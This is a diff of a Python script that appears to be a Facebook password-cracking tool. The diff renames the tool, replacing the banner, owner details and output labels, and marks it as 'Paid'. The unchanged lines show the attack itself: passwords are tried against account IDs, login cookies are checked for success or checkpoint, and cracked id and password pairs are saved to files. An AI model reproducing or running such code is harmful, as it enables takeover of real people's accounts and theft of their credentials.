@@ -150,18 +150,19 @@ awan =[
 'Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',]
 logo=("""\033[1;97m
-     d8b   db  .d88b.   .d88b.  d8888b. 
-     888o  88 .8P  Y8. .8P  Y8. 88  `8D 
-     \x1b[1;91m88V8o 88 88    88 88    88 88oooY' 
-     \x1b[1;91m88 V8o88 88    88 88    88 88~~~b. 
-   \x1b[1;97m  88  V888 `8b  d8' `8b  d8' 88   8D 
-     VP   V8P  `Y88P'   `Y88P'  Y8888P'
+     \033[1;97##     ## ##     ## ########    ###    ##     ## ##     ## #### ##       
+     ###   ### ##     ##      ##    ## ##   ###   ### ###   ###  ##  ##       
+     #### #### ##     ##     ##    ##   ##  #### #### #### ####  ##  ##       
+     ## ### ## ##     ##    ##    ##     ## ## ### ## ## ### ##  ##  ##       
+     ##     ## ##     ##   ##     ######### ##     ## ##     ##  ##  ##       
+     ##     ## ##     ##  ##      ##     ## ##     ## ##     ##  ##  ##       
+     ##     ##  #######  ######## ##     ## ##     ## ##     ## #### ######## \033[1;32m       XD
 \33[1;37m----------------------------------------------
-→   Owner      :  Md. Maruf Molla 
-→   Facebook   :  Md. Maruf Molla
-→   Github     :  M1F4T-2-0
-→   Tool Type  :  \x1b[1;91mFREE
-\x1b[1;97m→   Version    :  1.0
+→   Owner      :  Muzammil Hussain 
+→   Facebook   :  Muzammil Hussain
+→   Github     :  Muzi Tricker
+→   Tool Type  :  \x1b[1;91mPaid
+\x1b[1;97m→   Version    :  1.1
 \33[1;37m----------------------------------------------""")
 def linex():
 	print('\33[1;37m----------------------------------------------')
@@ -302,15 +303,15 @@ def mmm(ids,names,passlist):
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				
-				print('\033[1;92m[R1F4T-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/R1F4T-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[MUZI-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/MUZI-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					
-					print('\33[1;31m[R1F4T-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/R1F4T-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\33[1;31m[MUZI-CP] '+ids+' | '+pas+'\33[0;97m')
+					open('/sdcard/MUZI-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -373,14 +374,14 @@ def ffb(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\033[1;92m[R1F4T-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/R1F4T-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[MUZI-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/MUZI-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
-					print('\33[1;91m[R1F4T-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/R1F4T-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\33[1;91m[MUZI-CP] '+ids+' | '+pas+'\33[0;97m')
+					open('/sdcard/MUZI-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -848,15 +849,15 @@ def fcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m[R1F4T-OK] '+cid+' | '+ps+'\033[1;32m')
-				open('R1F4T-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				print('\033[1;92m[MUZI-OK] '+cid+' | '+ps+'\033[1;32m')
+				open('MUZI-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\33[1;31m[R1F4T-CP] '+cid+' | '+ps+'\33[0;97m')
-				open('R1F4T-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				print('\33[1;31m[MUZI-CP] '+cid+' | '+ps+'\33[0;97m')
+				open('MUZI-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
